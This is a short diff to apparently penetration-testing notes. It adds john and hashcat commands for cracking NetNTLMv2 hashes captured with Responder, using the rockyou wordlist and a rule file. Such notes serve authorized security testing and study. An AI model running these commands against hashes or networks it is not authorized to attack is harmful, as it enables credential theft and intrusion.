@@ -18,3 +18,13 @@ responder -I $net_interface
 ```
 
 The captured NT hashes can then be cracked offline. However, these are not the hashes that can be used in a Pass-The-Hash type of attack.
+
+NetNTLMv2 hash cracking:
+
+```bash
+# Quick
+john -w /usr/share/wordlists/rockyou.txt $hash
+
+# Common variations
+hashcat -m 5600 $hash /usr/share/wordlists/rockyou.txt --force --rules /usr/share/hashcat/rules/best64.rule
+```
